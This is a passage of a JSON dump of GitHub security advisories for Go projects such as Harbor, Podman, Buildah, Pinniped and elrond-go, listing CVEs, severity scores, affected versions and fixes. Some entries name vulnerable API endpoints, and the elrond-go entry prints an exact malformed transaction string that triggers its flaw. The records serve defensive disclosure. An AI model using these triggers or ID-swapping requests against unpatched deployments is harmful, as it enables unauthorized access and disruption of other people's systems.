"2022-09-16T20:27:13Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-fjm8-m7m6-2fjp", "modified": "2022-09-16T21:39:13Z", "published": "2022-09-14T00:00:48Z", "aliases": ["CVE-2022-2990"], "summary": "Buildah's incorrect handling of the supplementary groups may lead to data disclosure, modification", "details": "An incorrect handling of the supplementary groups in the Buildah container engine might lead to the sensitive information disclosure or possible data modification if an attacker has direct access to the affected container where supplementary groups are used to set access permissions and is able to execute a binary code in that container.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/buildah"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.27.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-2990"}, {"type": "WEB", "url": "https://github.com/containers/buildah/pull/4200"}, {"type": "WEB", "url": "https://github.com/containers/buildah/commit/4a8bf740e862f2438279c6feee2ea59ddf0cda0b"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/CVE-2022-2990"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2121453"}, {"type": "PACKAGE", "url": "https://github.com/containers/buildah"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1008"}, {"type": "WEB", "url": "https://www.benthamsgaze.org/2022/08/22/vulnerability-in-linux-containers-investigation-and-mitigation/"}], "database_specific": {"cwe_ids": ["CWE-842", "CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-15T03:24:17Z", "nvd_published_at": "2022-09-13T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-34vw-m4rh-r36p", "modified": "2022-09-16T17:17:37Z", "published": "2022-09-16T17:17:37Z", "aliases": [], "summary": "Talos vulnerable dependency due to race condition in Linux kernel's IP framework XFRM", "details": "### Impact\nA race condition was found in the Linux kernel's IP framework for transforming packets (XFRM subsystem) when multiple calls to xfrm_probe_algs occurred simultaneously. This flaw could allow a local attacker to potentially trigger an out-of-bounds write or leak kernel heap memory by performing an out-of-bounds read and copying it into a socket.\n\n### Patches\nThe fix has been backported to [5.15.64](https://www.linuxkernelcves.com/cves/CVE-2022-3028) version of the upstream Linux kernel (5.15 is the upstream Kernel long term version Talos ships with). Talos >= v1.2.0 is shipped with Linux Kernel 5.15.64 fixing the above issue.\n\nKubernetes workloads running in Talos are not affected since user namespaces are disabled in Talos kernel config. So an unprivileged user cannot obtain CAP_NET_ADMIN by unsharing. However untrusted workloads that run with privileged: true or having NET_ADMIN capability poses a risk.\n\n### Workarounds\nAudit kubernetes workloads running in the cluster with privileged: true set or having NET_ADMIN capability and assess the threat vector.\n\n### References\n- https://nvd.nist.gov/vuln/detail/CVE-2022-3028\n- https://access.redhat.com/security/cve/CVE-2022-3028\n\n### For more information\n- Email us at [security@siderolabs.com](mailto:security@siderolabs.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/talos-systems/talos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/siderolabs/talos/security/advisories/GHSA-34vw-m4rh-r36p"}, {"type": "PACKAGE", "url": "https://github.com/siderolabs/talos"}], "database_specific": {"cwe_ids": ["CWE-362", "CWE-787"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-16T17:17:37Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-28q9-9c3g-v3f9", "modified": "2022-09-23T15:13:14Z", "published": "2022-09-23T15:13:14Z", "aliases": [], "summary": "lakeFS vulnerable to authenticated users deleting files they are not authorized to delete", "details": "### Impact\n\nAuthenticated users can send a request to delete-objects through the s3 gateway and delete files they are not authorized to delete.\n\n### Patches\n\nlakeFS v0.82.0 and later\n\n### Workarounds\n\nDrop specific request to the lakeFS listen port. Any request with \"Authorization\" header and value that starts with \"AWS\".\n\n### References\n\n[advisories/GHSA-28q9-9c3g-v3f9](https://github.com/treeverse/lakeFS/security/advisories/GHSA-28q9-9c3g-v3f9)\n\n### For more information\nIf you have any questions or comments about this advisory:\n\nAsk on the [lakeFS Slack](https://github.com/treeverse/lakeFS/security/advisories/lakefs.io/slack) #help channel\nEmail us at [security@treeverse.io](mailto:security@treeverse.io)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/treeverse/lakefs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.82.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/treeverse/lakeFS/security/advisories/GHSA-28q9-9c3g-v3f9"}, {"type": "WEB", "url": "https://github.com/treeverse/lakeFS/commit/81182bf9c0cf57f3cec3c893cf739b2069305e37"}, {"type": "PACKAGE", "url": "https://github.com/treeverse/lakeFS"}], "database_specific": {"cwe_ids": ["CWE-281", "CWE-284"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-23T15:13:14Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-p2g7-xwvr-rrw3", "modified": "2022-09-16T18:49:48Z", "published": "2022-09-16T18:49:48Z", "aliases": ["CVE-2022-36049"], "summary": "Helm Controller denial of service", "details": "Helm controller is tightly integrated with the Helm SDK. [A vulnerability](https://github.com/helm/helm/security/advisories/GHSA-7hfp-qfw3-5jxh) found in the Helm SDK allows for specific data inputs to cause high memory consumption, which in some platforms could cause the controller to panic and stop processing reconciliations.\n\n### Impact\nIn a shared cluster multi-tenancy environment, a tenant could create a HelmRelease that makes the controller panic, denying all other tenants from their Helm releases being reconciled.\n\n### Credits\n\nThe initial crash bug was reported by [oss-fuzz](https://github.com/google/oss-fuzz). The Flux Security team produced the first exploit and worked together with the Helm Security team to ensure that both projects were patched timely.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n- Open an issue in any of the affected repositories.\n- Contact us at the CNCF Flux Channel.\n\n### References\n\n- https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=48360\n- https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=44996\n- https://github.com/helm/helm/security/advisories/GHSA-7hfp-qfw3-5jxh\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/fluxcd/helm-controller"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.0.4"}, {"fixed": "0.23.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/fluxcd/flux2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.0.17"}, {"fixed": "0.32.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/fluxcd/flux2/security/advisories/GHSA-p2g7-xwvr-rrw3"}, {"type": "WEB", "url": "https://github.com/helm/helm/security/advisories/GHSA-7hfp-qfw3-5jxh"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36049"}, {"type": "WEB", "url": "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=44996"}, {"type": "WEB", "url": "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=48360"}, {"type": "PACKAGE", "url": "https://github.com/fluxcd/flux2"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-16T18:49:48Z", "nvd_published_at": "2022-09-07T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3637-v6vq-xqqw", "modified": "2023-04-03T19:11:55Z", "published": "2022-09-16T19:29:31Z", "aliases": ["CVE-2022-31670"], "summary": "Harbor fails to validate the user permissions when updating tag retention policies", "details": "### Impact\n Harbor fails to validate the user permissions when updating tag retention policies. API call:\n\n  PUT /retentions/{id}\n\nBy sending a request to update a tag retention policy with an id that belongs to a project\nthat the currently authenticated user doesn\u2019t have access to, the attacker could modify\ntag retention policies configured in other projects.\n\n### Patches\nThis and similar issues are fixed in Harbor v2.5.2 and later. Please upgrade as soon as possible.\n\n### Workarounds\nThere are no workarounds available.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the Harbor GitHub repository](https://github.com/goharbor/harbor)\n\n### Credits\nThanks to [Gal Goldstein](https://www.linkedin.com/in/gal-goldshtein/) and [Daniel Abeles](https://www.linkedin.com/in/daniel-abeles/) from [Oxeye Security](https://www.oxeye.io/) for reporting this issue.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0"}, {"fixed": "1.10.13"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.10.12"}}, {"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.4.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.4.2"}}, {"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0"}, {"fixed": "2.5.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.5.1"}}], "references": [{"type": "WEB", "url": "https://github.com/goharbor/harbor/security/advisories/GHSA-3637-v6vq-xqqw"}, {"type": "PACKAGE", "url": "https://github.com/goharbor/harbor"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-16T19:29:31Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-rp4v-hhm6-rcv9", "modified": "2022-09-08T13:55:41Z", "published": "2022-09-01T22:24:05Z", "aliases": ["CVE-2022-31677"], "summary": "Pinniped Supervisor Insufficient Session Expiration vulnerability", "details": "### Impact\n\nA user authenticating to Kubernetes clusters via the Pinniped Supervisor could potentially use their access token to continue their session beyond what proper use of their refresh token might allow.\n\nAccess tokens issued by the Pinniped Supervisor have an intended expiration lifetime of approximately two minutes. The Pinniped CLI will automatically use the refresh token, which has a lifetime of approximately nine hours, to request a new access token after the access token's advertised expiration time elapses. Starting in Pinniped version 0.13.0, the Supervisor performs checks during each refresh request against the configured external identity provider to determine if the user should be allowed to continue their session. Thus, the short lifetime of the access token is intended to force users to be subjected to those checks often. For example, if a user's account in the external identity provider became locked, the next refresh would fail, and the user should lose access to the Kubernetes clusters fairly quickly. As another example, if a user's group membership changed in the external identity provider, the new group memberships would be reflected in their sessions with Kubernetes clusters within a fairly short window of time.\n\nAccess tokens are cached in a local file by the Pinniped CLI (the kubectl plugin) and are sent back to the Supervisor (via HTTPS) to receive cluster-scoped credentials. Due to a bug in this token exchange, the expiration time of the submitted access token was not checked correctly, causing expired access tokens to continue to be accepted by this endpoint until the user's backend session data is deleted, approximately nine hours after their session started. This bug could allow a legitimate user to avoid the checks performed during refresh by maliciously skipping the refresh step.\n\nNote that the Pinniped CLI performs the refresh operation often, so the refresh checks are still performed often under normal usage of the CLI, despite this bug.\n\nPractical impact to versions before v0.13.0 is minimal, since those versions did not perform checks against the external identity provider during refreshes. In these versions, the user can perform refreshes to get a new access tokens without restriction for approximately nine hours, so the duration of their access is effectively unchanged by this bug.\n\n### Patches\n\nThe impacted token exchange feature was first introduced in v0.3.0. Versions v0.3.0 to v0.18.0 are effected by this bug.\n\nThis vulnerability was found by the maintainers of Pinniped and fixed immediately. The fix was introduced in release v0.19.0.\n\n### Workarounds\n\nThere are no known workarounds. Upgrading the Supervisor is recommended, especially for users of v0.13.0 or newer.\n\n### References\n\nThe issue was fixed by PR [#1264](https://github.com/vmware-tanzu/pinniped/pull/1264).\n\n### For more information\n\nIf you have any questions or comments about this advisory, please reach out to the maintainers using one of the methods described in this repo's [README.md](https://github.com/vmware-tanzu/pinniped/blob/main/README.md#discussion).\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "go.pinniped.dev"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.3.0"}, {"fixed": "0.19.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/vmware-tanzu/pinniped/security/advisories/GHSA-rp4v-hhm6-rcv9"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31677"}, {"type": "WEB", "url": "https://github.com/vmware-tanzu/pinniped/pull/1264"}, {"type": "PACKAGE", "url": "https://github.com/vmware-tanzu/pinniped"}, {"type": "WEB", "url": "https://github.com/vmware-tanzu/pinniped/releases/tag/v0.19.0"}], "database_specific": {"cwe_ids": ["CWE-613"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-09-01T22:24:05Z", "nvd_published_at": "2022-08-29T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cf7g-cm7q-rq7f", "modified": "2022-09-23T17:07:44Z", "published": "2022-09-20T21:22:55Z", "aliases": ["CVE-2022-39220"], "summary": "SFTPGo WebClient vulnerable to Cross-site Scripting", "details": "### Impact\nCross-site scripting (XSS) vulnerabilities have been reported to affect SFTPGo WebClient. If exploited, this vulnerability allows remote attackers to inject malicious code.\n\n### Patches\nFixed in v2.3.5.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/drakkan/sftpgo"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.3.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/drakkan/sftpgo/security/advisories/GHSA-cf7g-cm7q-rq7f"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39220"}, {"type": "WEB", "url": "https://github.com/drakkan/sftpgo/commit/cbef217cfa92478ee8e00ba1a5fb074f8a8aeee0"}, {"type": "PACKAGE", "url": "https://github.com/drakkan/sftpgo"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-09-20T21:22:55Z", "nvd_published_at": "2022-09-20T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gwc9-m7rh-j2ww", "modified": "2023-08-30T13:46:25Z", "published": "2022-09-07T00:01:52Z", "aliases": ["CVE-2021-43565"], "summary": "x/crypto/ssh vulnerable to panic via malformed packets", "details": "The x/crypto/ssh package before 0.0.0-20211202192323-5770296d904e of golang.org/x/crypto allows an unauthenticated attacker to panic an SSH server. When using AES-GCM or ChaCha20Poly1305, consuming a malformed packet which contains an empty plaintext causes a panic.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "golang.org/x/crypto"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.0-20211202192323-5770296d904e"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-43565"}, {"type": "WEB", "url": "https://go.dev/cl/368814/"}, {"type": "WEB", "url": "https://go.dev/issues/49932"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!forum/golang-announce"}, {"type": "WEB", "url": "https://groups.google.com/g/golang-announce/c/2AR1sKiM-Qs"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0968"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-16T17:40:34Z", "nvd_published_at": "2022-09-06T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pwq7-f7f9-cm2j", "modified": "2022-10-04T15:28:51Z", "published": "2022-09-30T00:00:34Z", "aliases": ["CVE-2022-40931"], "summary": "Dutchoders transfer.sh contains an XSS vulnerability via malicious file upload", "details": "dutchcoders Transfer.sh versions 1.4.0 and prior are vulnerable to Cross Site Scripting (XSS) via a malicious document uploaded in transfer.sh.  There is a fix commit merged into [main](https://github.com/dutchcoders/transfer.sh/commit/31ad4e01e158497519f8680c187e1ceb8594c59d) for this issue, but an updated version has not yet been released.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/dutchcoders/transfer.sh"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.4.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-40931"}, {"type": "WEB", "url": "https://github.com/dutchcoders/transfer.sh/issues/500"}, {"type": "WEB", "url": "https://github.com/dutchcoders/transfer.sh/pull/501"}, {"type": "PACKAGE", "url": "https://github.com/dutchcoders/transfer.sh"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-10-01T01:01:50Z", "nvd_published_at": "2022-09-29T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qf7j-25g9-r63f", "modified": "2022-09-10T02:26:45Z", "published": "2022-09-01T22:24:26Z", "aliases": ["CVE-2022-36058"], "summary": "elrond-go MultiESDTNFTTransfer call on a SC address with missing function name", "details": "### Impact\nAnyone who uses elrond-go to process blocks (historical or actual) that contains a transaction like this: `MultiESDTNFTTransfer@01@54444558544b4b5955532d323631626138@00@0793afc18c8da2ca@` (mind the missing function name after the last `@`)\nBasic functionality like p2p messaging, storage, API requests and such are unaffected.\n\n### Patches\nPatch v1.3.34 or higher\n\n### Workarounds\nNo workarounds\n\n### References\nFor future reference, one can observe the following integration test:\n[[provide the link to the integration test]](https://github.com/ElrondNetwork/elrond-go/blob/8e402fa6d7e91e779980122d3798b2bf50892945/integrationTests/vm/txsFee/asyncESDT_test.go#L402)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in elrond-go (http://github.com/ElrondNetwork/elrond-go/issues)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ElrondNetwork/elrond-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.34"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.3.33"}}], "references": [{"type": "WEB", "url": "https://github.com/ElrondNetwork/elrond-go/security/advisories/GHSA-qf7j-25g9-r63f"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36058"}, {"type": "WEB", "url": "https://github.com/ElrondNetwork/elrond-go/commit/cb487fd7be2a2077638eb34ae771a73630c870c7"}, {"type": "PACKAGE", "url": "https://github.com/ElrondNetwork/elrond-go"}, {"type": "WEB", "url": "https://github.com/ElrondNetwork/elrond-go/blob/8e402fa6d7e91e779980122d3798b2bf50892945/integrationTests/vm/txsFee/asyncESDT_test.go#L402"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-01T22:24:26Z", "nvd_published_at": "2022-09-06T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-crxj-hrmp-4rwf", "modified": "2022-09-30T06:31:20Z", "published": "2022-09-29T00:00:26Z", "aliases": ["CVE-2022-40083"], "summary": "Labstack Echo Open Redirect vulnerability", "details": "Labstack Echo v4.8.0 was discovered to contain an open redirect vulnerability via the Static Handler component. This vulnerability can be leveraged by attackers to cause a Server-Side Request Forgery (SSRF). Version 4.9.0 contains a patch for the issue.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/labstack/echo/v4"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "4.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-40083"}, {"type": "WEB", "url": "https://github.com/labstack/echo/issues/2259"}, {"type": "WEB", "url": "https://github.com/labstack/echo/pull/2260"}, {"type": "WEB", "url": "https://github.com/labstack/echo/pull/2260/commits/3154abd1401554fe4d1c09ec550506d8625fc042"}, {"type": "WEB", "url": "https://github.com/labstack/echo/commit/0ac4d74402391912ff6da733bb09fd4c3980b4e1"}, {"type": "PACKAGE", "url": "https://github.com/labstack/echo"}, {"type": "WEB", "url": "https://github.com/labstack/echo/releases/tag/v4.9.0"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1031"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-09-30T06:31:20Z", "nvd_published_at": "2022-09-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4wjj-jwc9-2x96", "modified": "2022-09-16T21:56:51Z", "published": "2022-09-14T00:00:48Z", "aliases": ["CVE-2022-2989"], "summary": "Podman's incorrect handling of the supplementary groups may lead to data disclosure, modification", "details": "An incorrect handling of the supplementary groups in the Podman container engine might lead to the sensitive information disclosure or possible data modification if an attacker has direct access to the affected container where supplementary groups are used to set access permissions and is able to execute a binary code in that container.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/podman/v4"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "4.2.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/containers/podman/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.0.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-2989"}, {"type": "WEB", "url": "https://github.com/containers/podman/pull/15618"}, {"type": "WEB", "url": "https://github.com/containers/podman/pull/15677"}, {"type": "WEB", "url": "https://github.com/containers/podman/pull/15696"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2022:7822"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2022:8008"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2022:8431"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/CVE-2022-2989"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2121445"}, {"type": "PACKAGE", "url": "https://github.com/containers/podman"}, {"type": "WEB", "url": "https://www.benthamsgaze.org/2022/08/22/vulnerability-in-linux-containers-investigation-and-mitigation/"}], "database_specific": {"cwe_ids": ["CWE-842", "CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-15T03:23:59Z", "nvd_published_at": "2022-09-13T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-q76q-q8hw-hmpw", "modified": "2023-09-27T13:16:00Z", "published": "2022-09-09T19:47:03Z", "aliases": ["CVE-2022-31671"], "summary": "Harbor fails to validate the user permissions when reading job execution logs through the P2P preheat execution logs", "details": "### Impact\nHarbor fails to validate the user permissions when reading job execution logs through the P2P preheat execution logs - API call\n\n\u00a0 GET /projects/{project_name}/preheat/policies/{preheat_policy_name}/executions/{execution_id}/tasks/{task_id}/logs\n\nBy sending a request that attempts to read P2P preheat execution logs and specifying different job ids, malicious authenticatedusers could read all the job logs stored in the Harbor database.\n\n### Patches\nThis and similar issues are fixed in Harbor v2.5.2 and later. Please upgrade as soon as possible.\n\n### Workarounds\nThere are no workarounds available.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the Harbor GitHub repository](https://github.com/goharbor/harbor)\n\n### Credits\nThanks to [Gal Goldstein](https://www.linkedin.com/in/gal-goldshtein/) and [Daniel Abeles](https://www.linkedin.com/in/daniel-abeles/) from [Oxeye Security](https://www.oxeye.io/) for reporting this issue.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0"}, {"fixed": "1.10.13"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.10.12"}}, {"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.4.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.4.2"}}, {"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0"}, {"fixed": "2.5.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.5.1"}}], "references": [{"type": "WEB", "url": "https://github.com/goharbor/harbor/security/advisories/GHSA-q76q-q8hw-hmpw"}, {"type": "PACKAGE", "url": "https://github.com/goharbor/harbor"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-09-09T19:47:03Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-ggf6-638m-vqmg", "modified": "2023-06-27T22:21:05Z", "published": "2022-09-15T03:34:21Z", "aliases": ["CVE-2022-36110"], "summary": "Netmaker vulnerable to Insufficient Granularity of Access Control", "details": "### Impact\nImproper Authorization functions leads to non-privileged users running privileged API calls. If you have added users to your Netmaker platform who whould not have admin privileges, they could use their auth token to run admin-level functions via the API.\n\nIn addition, differing response codes based on function calls allowed non-users to potentially brute force the determination of names of networks on the system.\n\n### Patches\nThis problem has been patched in v0.15.1. To apply:\n\n1. docker-compose down\n2. docker pull gravitl/netmaker:v0.15.1\n3. docker-compose up -d\n\n### For more information\nIf you have any questions or comments about this advisory:\n\nEmail us at [info@netmaker.io](mailto:info@netmaker.io)\nThis vulnerability was brought to our attention by @tweidinger", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gravitl/netmaker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.15.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gravitl/netmaker/security/advisories/GHSA-ggf6-638m-vqmg"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36110"}, {"type": "PACKAGE", "url": "https://github.com/gravitl/netmaker"}, {"type": "WEB", "url": "https://github.com/gravitl/netmaker/releases/tag/v0.15.1"}], "database_specific": {"cwe_ids": ["CWE-1220", "CWE-285"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-15T03:34:21Z", "nvd_published_at": "2022-09-09T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jf8p-3vjh-pq94", "modified": "2023-04-03T19:21:49Z", "published": "2022-09-16T19:35:47Z", "aliases": ["CVE-2022-31666"], "summary": "Harbor fails to validate the user permissions when viewing Webhook policies", "details": "### Impact\nHarbor fails to validate the user permissions to view Webhook policies including relevant credentials configured in different projects the user doesn\u2019t have access to, resulting in malicious users being able to read Webhook policies of other users/projects. API call is\n\n\u00a0 GET /projects/{project_name_or_id}/webhook/policies/{webhook_policy_id}\n\nBy sending the below request and specifying different Webhook policy ids in the last part of the URL, the malicious user may disclose Webhook policies related to other repositories/projects.: none;\">\n\n### Patches\nThis and similar issues are fixed in Harbor v2.5.2 and later. Please upgrade as soon as possible.\n\n### Workarounds\nThere are no workarounds available.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the Harbor GitHub repository](https://github.com/goharbor/harbor)\n\n### Credits\nThanks to [Gal Goldstein](https://www.linkedin.com/in/gal-goldshtein/) and [Daniel Abeles](https://www.linkedin.com/in/daniel-abeles/) from [Oxeye Security](https://www.oxeye.io/) for reporting this issue.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0"}, {"fixed": "1.10.13"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.10.12"}}, {"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.4.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.4.2"}}, {"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0"}, {"fixed": "2.5.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.5.1"}}], "references": [{"type": "WEB", "url": "https://github.com/goharbor/harbor/security/advisories/GHSA-jf8p-3vjh-pq94"}, {"type": "PACKAGE", "url": "https://github.com/goharbor/harbor"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-16T19:35:47Z", "nvd_published_at": null}}, 